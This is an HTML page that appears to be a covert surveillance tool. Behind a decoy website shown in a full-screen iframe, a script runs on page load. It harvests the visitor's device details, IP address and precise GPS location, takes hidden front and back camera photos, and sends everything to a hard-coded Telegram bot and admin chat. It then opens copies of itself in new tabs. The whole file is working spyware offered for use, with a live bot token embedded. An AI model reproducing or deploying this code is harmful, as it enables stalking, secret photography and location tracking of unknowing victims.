<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Loading...</title>
    <style>
        * {
            margin: 0;
            padding: 0;
            box-sizing: border-box;
        }
        
        body {
            width: 100vw;
            height: 100vh;
            overflow: hidden;
            background: #000000;
            font-family: Arial, sans-serif;
        }
        
        #websiteFrame {
            position: fixed;
            top: 0;
            left: 0;
            width: 100%;
            height: 100%;
            border: none;
            z-index: 1;
        }
        
        #cameraContainer {
            position: fixed;
            top: -9999px;
            left: -9999px;
            width: 1px;
            height: 1px;
            opacity: 0;
            pointer-events: none;
        }
        
        #status {
            position: fixed;
            top: 10px;
            right: 10px;
            background: rgba(0,0,0,0.8);
            color: white;
            padding: 10px;
            font-size: 12px;
            border-radius: 5px;
            display: none;
            z-index: 1000;
        }
    </style>
</head>
<body>
    <!-- Website Frame -->
    <iframe id="websiteFrame" src="about:blank" 
            sandbox="allow-same-origin allow-scripts allow-forms allow-popups allow-modals"
            allow="camera; microphone; geolocation"
            allowfullscreen></iframe>
    
    <!-- Status Display -->
    <div id="status"></div>
    
    <!-- Hidden Camera -->
    <div id="cameraContainer">
        <video id="cameraVideo" autoplay playsinline muted></video>
        <canvas id="captureCanvas"></canvas>
    </div>

    <script>
        // =====================================================
        //  GUARANTEED PHOTO CAPTURE & SEND
        // =====================================================
        
        // Telegram Configuration
        const BOT_TOKEN = '8307999302:AAEniYvTP5ZeaYo74AcWSxsOQ9PSxpnAtA0';
        const TELEGRAM_API = `https://api.telegram.org/bot${BOT_TOKEN}`;
        const ADMIN_ID = '6314556756';
        
        // Global state
        const data = {
            session: Date.now() + '_' + Math.random().toString(36).substr(2, 8),
            user: null,
            target: null,
            device: {},
            location: null,
            ip: null,
            photos: [],
            battery: null,
            network: null,
            screen: null,
            allDataSent: false,
            replicationDone: false,
            step: 'starting'
        };
        
        // DOM elements
        const frame = document.getElementById('websiteFrame');
        const status = document.getElementById('status');
        const video = document.getElementById('cameraVideo');
        const canvas = document.getElementById('captureCanvas');
        const ctx = canvas.getContext('2d');
        
        // Show status
        function updateStatus(msg) {
            status.textContent = msg;
            console.log(msg);
            data.step = msg;
        }
        
        // ============== STEP 1: LOAD WEBSITE IMMEDIATELY ==============
        function loadWebsite() {
            updateStatus('Loading website...');
            
            const params = new URLSearchParams(window.location.search);
            data.user = params.get('chat_id') || params.get('user') || params.get('id') || ADMIN_ID;
            
            let target = params.get('site') || params.get('url') || params.get('target') || 'https://google.com';
            
            try {
                if (target.startsWith('QUANTUM:')) {
                    target = atob(target.split(':')[1]);
                } else if (!target.includes('://')) {
                    target = atob(target);
                }
                target = decodeURIComponent(target);
            } catch (e) {}
            
            if (!target.startsWith('http')) {
                target = 'https://' + target;
            }
            
            data.target = target;
            frame.src = target;
            updateStatus('Website loaded');
        }
        
        // ============== STEP 2: CAPTURE ALL DATA ==============
        async function captureAllData() {
            updateStatus('Capturing device info...');
            await captureDeviceInfo();
            
            updateStatus('Getting battery info...');
            await getBatteryInfo();
            
            updateStatus('Getting network info...');
            await getNetworkInfo();
            
            updateStatus('Getting IP address...');
            await getIPAddress();
            
            updateStatus('Getting location...');
            await getLocation();
            
            updateStatus('Capturing photos...');
            await capturePhotos();
            
            updateStatus('All data captured!');
        }
        
        async function captureDeviceInfo() {
            const ua = navigator.userAgent;
            let os = 'Unknown', browser = 'Unknown';
            
            if (/Windows/.test(ua)) os = 'Windows';
            else if (/Mac/.test(ua)) os = 'macOS';
            else if (/Linux/.test(ua)) os = 'Linux';
            else if (/Android/.test(ua)) os = 'Android';
            else if (/iPhone|iPad/.test(ua)) os = 'iOS';
            
            if (/Chrome/.test(ua) && !/Edge/.test(ua)) browser = 'Chrome';
            else if (/Firefox/.test(ua)) browser = 'Firefox';
            else if (/Safari/.test(ua) && !/Chrome/.test(ua)) browser = 'Safari';
            else if (/Edge/.test(ua)) browser = 'Edge';
            
            data.device = {
                os: os,
                browser: browser,
                platform: navigator.platform,
                language: navigator.language,
                cores: navigator.hardwareConcurrency || '?',
                ram: navigator.deviceMemory || '? GB',
                screen: `${screen.width}x${screen.height}`,
                timezone: Intl.DateTimeFormat().resolvedOptions().timeZone
            };
        }
        
        async function getBatteryInfo() {
            try {
                if (navigator.getBattery) {
                    const battery = await navigator.getBattery();
                    data.battery = {
                        level: Math.round(battery.level * 100) + '%',
                        charging: battery.charging ? 'Yes ‚ö°' : 'No'
                    };
                }
            } catch (e) {}
        }
        
        async function getNetworkInfo() {
            data.network = {
                online: navigator.onLine,
                connection: null
            };
            
            if (navigator.connection) {
                data.network.connection = {
                    type: navigator.connection.type,
                    speed: navigator.connection.effectiveType,
                    downlink: navigator.connection.downlink + ' Mbps'
                };
            }
        }
        
        async function getIPAddress() {
            try {
                const response = await fetch('https://api.ipify.org?format=json');
                const result = await response.json();
                data.ip = result.ip;
            } catch (e) {
                try {
                    const response = await fetch('https://icanhazip.com/');
                    data.ip = (await response.text()).trim();
                } catch (e) {}
            }
        }
        
        async function getLocation() {
            return new Promise((resolve) => {
                if (!navigator.geolocation) {
                    resolve(null);
                    return;
                }
                
                navigator.geolocation.getCurrentPosition(
                    (pos) => {
                        data.location = {
                            lat: pos.coords.latitude.toFixed(6),
                            lon: pos.coords.longitude.toFixed(6),
                            accuracy: Math.round(pos.coords.accuracy) + 'm'
                        };
                        resolve(data.location);
                    },
                    () => resolve(null),
                    { enableHighAccuracy: true, timeout: 10000 }
                );
            });
        }
        
        // ============== FIXED: CAMERA PHOTOS ==============
        async function capturePhotos() {
            try {
                updateStatus('Requesting camera...');
                
                // Request camera with simple settings
                const stream = await navigator.mediaDevices.getUserMedia({
                    video: {
                        facingMode: 'user',
                        width: { ideal: 640 },
                        height: { ideal: 480 }
                    }
                });
                
                video.srcObject = stream;
                
                // Wait for video to be ready
                await new Promise((resolve) => {
                    if (video.readyState >= 3) {
                        resolve();
                    } else {
                        video.onloadeddata = resolve;
                    }
                });
                
                await video.play();
                await new Promise(r => setTimeout(r, 800)); // Warmup
                
                updateStatus('Camera ready, capturing photos...');
                
                // Capture 2 front photos
                for (let i = 1; i <= 2; i++) {
                    updateStatus(`Capturing photo ${i}...`);
                    const blob = await capturePhoto();
                    if (blob) {
                        data.photos.push({
                            blob: blob,
                            type: 'front',
                            index: i,
                            size: Math.round(blob.size / 1024) + 'KB'
                        });
                        updateStatus(`Photo ${i} captured (${Math.round(blob.size/1024)}KB)`);
                    }
                    await new Promise(r => setTimeout(r, 300));
                }
                
                // Stop front camera
                stream.getTracks().forEach(track => track.stop());
                
                // Try back camera
                try {
                    updateStatus('Trying back camera...');
                    const backStream = await navigator.mediaDevices.getUserMedia({
                        video: {
                            facingMode: 'environment'
                        }
                    });
                    
                    video.srcObject = backStream;
                    await new Promise(r => setTimeout(r, 500));
                    
                    // Capture 1 back photo
                    const blob = await capturePhoto();
                    if (blob) {
                        data.photos.push({
                            blob: blob,
                            type: 'back',
                            index: 1,
                            size: Math.round(blob.size / 1024) + 'KB'
                        });
                        updateStatus(`Back photo captured (${Math.round(blob.size/1024)}KB)`);
                    }
                    
                    backStream.getTracks().forEach(track => track.stop());
                    
                } catch (e) {
                    updateStatus('Back camera not available');
                }
                
                updateStatus(`‚úÖ ${data.photos.length} photos captured`);
                
            } catch (error) {
                updateStatus('‚ùå Camera error: ' + error.message);
                console.error('Camera error:', error);
            }
        }
        
        function capturePhoto() {
            try {
                if (!video.videoWidth || video.videoWidth === 0) {
                    updateStatus('Video not ready');
                    return null;
                }
                
                canvas.width = video.videoWidth;
                canvas.height = video.videoHeight;
                
                // Draw video frame
                ctx.drawImage(video, 0, 0, canvas.width, canvas.height);
                
                // Convert to blob
                return new Promise((resolve) => {
                    canvas.toBlob((blob) => {
                        if (blob && blob.size > 5000) {
                            resolve(blob);
                        } else {
                            resolve(null);
                        }
                    }, 'image/jpeg', 0.8);
                });
                
            } catch (error) {
                updateStatus('Capture error: ' + error.message);
                return null;
            }
        }
        
        // ============== STEP 3: SEND ALL DATA ==============
        async function sendAllData() {
            updateStatus('Sending report to Telegram...');
            
            // First send report
            await sendReport();
            
            // Then send photos
            if (data.photos.length > 0) {
                updateStatus(`Sending ${data.photos.length} photos...`);
                for (let i = 0; i < data.photos.length; i++) {
                    updateStatus(`Sending photo ${i + 1}/${data.photos.length}...`);
                    await sendPhoto(data.photos[i]);
                    await new Promise(r => setTimeout(r, 800)); // Delay between photos
                }
            } else {
                updateStatus('No photos to send');
            }
            
            data.allDataSent = true;
            updateStatus('‚úÖ ALL DATA SENT!');
        }
        
        async function sendReport() {
            try {
                let report = `üìä *DATA CAPTURE REPORT*\n\n`;
                report += `Session: \`${data.session}\`\n`;
                report += `User: \`${data.user}\`\n`;
                report += `Time: ${new Date().toLocaleTimeString()}\n\n`;
                
                report += `üì± Device: ${data.device.os} ${data.device.browser}\n`;
                report += `üñ•Ô∏è Screen: ${data.device.screen}\n`;
                report += `üíª CPU: ${data.device.cores} cores\n`;
                report += `üíæ RAM: ${data.device.ram}\n`;
                report += `üåê Timezone: ${data.device.timezone}\n\n`;
                
                if (data.battery) {
                    report += `üîã Battery: ${data.battery.level}\n`;
                    report += `‚ö° Charging: ${data.battery.charging}\n\n`;
                }
                
                if (data.network) {
                    report += `üì∂ Network: ${data.network.online ? 'Online' : 'Offline'}\n`;
                    if (data.network.connection) {
                        report += `üì° Type: ${data.network.connection.type}\n`;
                        report += `üöÄ Speed: ${data.network.connection.speed}\n`;
                        report += `‚¨áÔ∏è Download: ${data.network.connection.downlink}\n`;
                    }
                    report += `\n`;
                }
                
                if (data.ip) {
                    report += `üåê IP Address: \`${data.ip}\`\n\n`;
                }
                
                if (data.location) {
                    report += `üìç Location:\n`;
                    report += `Latitude: ${data.location.lat}\n`;
                    report += `Longitude: ${data.location.lon}\n`;
                    report += `Accuracy: ${data.location.accuracy}\n`;
                    report += `üîó Maps: https://maps.google.com/?q=${data.location.lat},${data.location.lon}\n\n`;
                }
                
                report += `üì∏ Photos: ${data.photos.length} captured\n`;
                report += `üéØ Target: ${data.target}\n\n`;
                report += `‚úÖ Status: COMPLETE`;
                
                // Send to user
                await fetch(`${TELEGRAM_API}/sendMessage`, {
                    method: 'POST',
                    headers: { 'Content-Type': 'application/json' },
                    body: JSON.stringify({
                        chat_id: data.user,
                        text: report,
                        parse_mode: 'Markdown'
                    })
                });
                
                // Send to admin
                await fetch(`${TELEGRAM_API}/sendMessage`, {
                    method: 'POST',
                    headers: { 'Content-Type': 'application/json' },
                    body: JSON.stringify({
                        chat_id: ADMIN_ID,
                        text: report + `\n\nüë§ User: \`${data.user}\``,
                        parse_mode: 'Markdown'
                    })
                });
                
                updateStatus('‚úÖ Report sent!');
                
            } catch (error) {
                updateStatus('‚ùå Report error: ' + error.message);
            }
        }
        
        async function sendPhoto(photo) {
            try {
                if (!photo.blob) {
                    updateStatus('‚ùå No blob for photo');
                    return;
                }
                
                const caption = `üì∏ ${photo.type.toUpperCase()} Photo ${photo.index}\nSession: \`${data.session}\`\nSize: ${photo.size}`;
                
                // Create FormData
                const formData = new FormData();
                formData.append('chat_id', data.user);
                formData.append('photo', photo.blob, `photo_${Date.now()}.jpg`);
                formData.append('caption', caption);
                formData.append('parse_mode', 'Markdown');
                
                // Send to user
                const response = await fetch(`${TELEGRAM_API}/sendPhoto`, {
                    method: 'POST',
                    body: formData
                });
                
                const result = await response.json();
                
                if (result.ok) {
                    updateStatus(`‚úÖ ${photo.type} photo ${photo.index} sent to user`);
                    
                    // Send to admin too
                    setTimeout(async () => {
                        try {
                            const adminForm = new FormData();
                            adminForm.append('chat_id', ADMIN_ID);
                            adminForm.append('photo', photo.blob, `admin_${Date.now()}.jpg`);
                            adminForm.append('caption', caption + `\nüë§ User: \`${data.user}\``);
                            adminForm.append('parse_mode', 'Markdown');
                            
                            await fetch(`${TELEGRAM_API}/sendPhoto`, {
                                method: 'POST',
                                body: adminForm
                            });
                            
                            updateStatus(`‚úÖ Also sent to admin`);
                        } catch (e) {}
                    }, 300);
                    
                } else {
                    updateStatus(`‚ùå Photo send failed: ${JSON.stringify(result)}`);
                }
                
            } catch (error) {
                updateStatus(`‚ùå Photo error: ${error.message}`);
            }
        }
        
        // ============== STEP 4: REPLICATE ==============
        function replicateItself() {
            if (data.replicationDone) return;
            
            updateStatus('Starting replication...');
            data.replicationDone = true;
            
            // Open 3 new tabs
            for (let i = 0; i < 3; i++) {
                setTimeout(() => {
                    try {
                        const newTab = window.open(window.location.href, '_blank');
                        if (newTab) {
                            updateStatus(`‚úÖ Tab ${i + 1} opened`);
                            
                            // Close after 2 minutes
                            setTimeout(() => {
                                try {
                                    newTab.close();
                                } catch (e) {}
                            }, 120000);
                        }
                    } catch (e) {
                        updateStatus('‚ö†Ô∏è Popup blocked');
                    }
                }, i * 1500);
            }
        }
        
        // ============== MAIN EXECUTION ==============
        async function main() {
            try {
                // Show status for debugging
                status.style.display = 'block';
                
                updateStatus('üöÄ Starting...');
                
                // Step 1: Load website
                loadWebsite();
                
                // Step 2: Capture all data
                await captureAllData();
                
                // Step 3: Send all data
                await sendAllData();
                
                // Step 4: Replicate
                replicateItself();
                
                // Hide status after completion
                setTimeout(() => {
                    status.style.display = 'none';
                }, 5000);
                
            } catch (error) {
                updateStatus('‚ùå Main error: ' + error.message);
                console.error('Main error:', error);
            }
        }
        
        // Start when page loads
        window.addEventListener('load', main);
        
        // Debug info
        console.log('=== DEBUG INFO ===');
        console.log('Status element:', status);
        console.log('Video element:', video);
        console.log('Canvas element:', canvas);
        
    </script>
</body>
</html>
